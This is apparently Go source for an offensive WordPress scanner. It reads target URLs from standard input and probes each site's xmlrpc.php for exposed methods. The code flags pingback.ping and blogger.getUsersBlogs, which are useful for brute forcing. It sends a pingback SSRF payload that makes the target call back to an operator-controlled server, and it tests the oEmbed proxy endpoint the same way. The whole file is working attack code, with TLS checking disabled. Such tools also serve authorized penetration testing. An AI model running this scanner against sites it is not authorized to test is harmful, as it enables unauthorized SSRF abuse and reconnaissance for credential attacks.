package core

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
	"github.com/rodnt/quickpress/utils"
)

const ua = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 - github.com/pownx)"

//Scan struct
type Scan struct {
	target string
	server string
}

//New Create constructor
func New(t string, s string) *Scan {
	return &Scan{target: t, server: s}
}

func newClient() *http.Client {
	//tr = transport
	tr := &http.Transport{
		MaxIdleConns:    30,
		IdleConnTimeout: time.Second,
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   time.Second * 10,
			KeepAlive: time.Second,
		}).DialContext,
	}

	re := func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	return &http.Client{
		Transport:     tr,
		CheckRedirect: re,
		Timeout:       time.Second * 10,
	}
}

//FromStdin test results from stdin
func (s *Scan) FromStdin() {
	var wg sync.WaitGroup
	sc := bufio.NewScanner(os.Stdin)

	for sc.Scan() {
		rawURL := sc.Text()
		wg.Add(1)

		go func() {
			defer wg.Done()

			if s.IsAlive(rawURL) {
				s.VerifyMethods(rawURL)
			}
		}()
	}
	wg.Wait()
}

//IsAlive veirfy if xmlrpc is open
func (s *Scan) IsAlive(url string) bool {

	cli := newClient()

	urlRequest := url + "/xmlrpc.php"
	fmt.Printf("[*] Verify [%s]\n", urlRequest)
	req, err := http.NewRequest("GET", urlRequest, nil)
	req.Header.Set("User-Agent", ua)

	if err != nil {
		return false
	}

	resp, err := cli.Do(req)
	if err != nil {
		return false
	}

	if resp.StatusCode != 200 {
		fmt.Printf("[*] Target [%s] have a bad status code..[%d]\n", url, resp.StatusCode)
	} else {
		fmt.Printf("[*] Target [%s] have a cool status code [%d].\n", url, resp.StatusCode)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		return false
	}

	responseBody := string(body)

	matchedString, err := regexp.MatchString(`XML-RPC server accepts POST requests only`, responseBody)

	if matchedString {
		return true
	}

	return false
}

//VerifyMethods verify methods xmlrpc
func (s *Scan) VerifyMethods(url string) {

	cli := newClient()
	body := "<methodCall> <methodName>system.listMethods</methodName> </methodCall>"
	urlReq := url + "/xmlrpc.php"
	req, err := http.NewRequest("POST", urlReq, bytes.NewBuffer([]byte(body)))
	if err != nil {
		log.Println(err)
	}
	defer req.Body.Close()

	req.Header.Add("User-Agent", ua)
	req.Header.Add("Content-Type", "application/xml; charset=utf-8")

	res, err := cli.Do(req)
	if err != nil {
		log.Println(err)
	}

	bodyString, err := ioutil.ReadAll(res.Body)

	if err != nil {
		log.Println(err)
	}

	b := string(bodyString)

	matchedStringPing, err := regexp.MatchString(`(<value><string>pingback.ping</string></value>)`, b)
	if err != nil {
		log.Println(err)
	}

	if matchedStringPing {
		color.Magenta("[+] Pingback open at [%s]\n", url)

	}

	s.Ssrf(url)

	matchedStringBrute, err := regexp.MatchString(`(<value><string>blogger.getUsersBlogs</string></value>)`, b)

	if err != nil {
		log.Println(err)
	}

	if matchedStringBrute {
		color.Magenta("[+] blogger.getUsersBlogs open at [%s]\n", url)
	}

}

func parseTargetName(s string) string {
	if strings.Contains(s, "http://") {
		name := strings.ReplaceAll(s, "http://", "")
		return name
	}

	name := strings.ReplaceAll(s, "https://", "")
	return name
}

func removeLastSlash(s string) string {
	target := strings.TrimSuffix(s, "/")
	return target
}

//Ssrf testing ssrf if avaliable
func (s *Scan) Ssrf(target string) {

	targetParsed := removeLastSlash(target)

	url := target + "/xmlrpc.php"

	name := parseTargetName(targetParsed)
	sv := parseTargetName(s.server)

	parsedServer := "https://" + name + "." + sv
	fmt.Println(parsedServer)

	xml := utils.SSRF

	replaceServer := strings.ReplaceAll(xml, "$SERVER$", parsedServer)
	replaceTarget := strings.ReplaceAll(replaceServer, "$TARGET$", targetParsed)

	body := replaceTarget

	c := &http.Client{}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(body)))
	if err != nil {
		log.Println(err)
	}
	defer req.Body.Close()

	req.Header.Add("User-Agent", ua)
	req.Header.Add("Content-Type", "application/xml; charset=utf-8")

	resp, err := c.Do(req)
	if err != nil {
		fmt.Println(err)
	}

	if resp.StatusCode == 200 {
		color.Yellow("[*] SSRF testing..\n")
	}
	color.Cyan("[+] SSRF TEST DONE at [%s]: verify at [%s] if a HTTP connection was recevied", targetParsed, s.server)

}

//ProxyTesting testing oem proxyng server
func (s *Scan) ProxyTesting() {
	client := newClient()

	url := s.target + "/wp-json/oembed/1.0/proxy?url=" + s.server + "/pownx"

	req, err := http.NewRequest("GET", url, nil)
	req.Header.Set("User-Agent", ua)
	if err != nil {
		log.Println(err)
	}

	resp, err := client.Do(req)
	if err != nil {
		log.Println(err)
	}

	if resp.StatusCode == 200 {
		color.Cyan("[+] wp-json/oembed/1.0/proxy open, verify is a HTTP was recevied at your server..")
	}

}
